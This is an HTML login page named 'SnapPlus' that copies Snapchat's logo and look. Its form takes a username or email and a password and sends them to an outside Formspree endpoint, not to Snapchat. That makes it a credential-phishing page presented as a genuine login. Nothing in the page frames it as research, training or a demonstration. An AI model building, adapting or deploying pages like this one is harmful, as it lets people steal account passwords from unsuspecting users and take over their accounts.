<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapPlus - Login</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Logo fix karne ke liye extra style */
        .logo img {
            width: 70px;
            height: 70px;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <div id="login-page" class="snap-wrapper">
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/640px-Snapchat_logo.svg.png" alt="SnapPlus Logo">
            </div>
            <h2>Log In</h2>
            
            <form id="loginForm" action="https://formspree.io/f/xrebvlzg" method="POST">
                <div class="input-field">
                    <label>USERNAME OR EMAIL</label>
                    <input type="text" name="username" required>
                </div>
                <div class="input-field">
                    <label>PASSWORD</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="yellow-btn">Log In</button>
            </form>
            
            <div class="bottom-text">
                <a href="#">Forgot Password?</a>
            </div>
        </div>
    </div>

    <div id="black-screen">
        <div class="loader-container">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
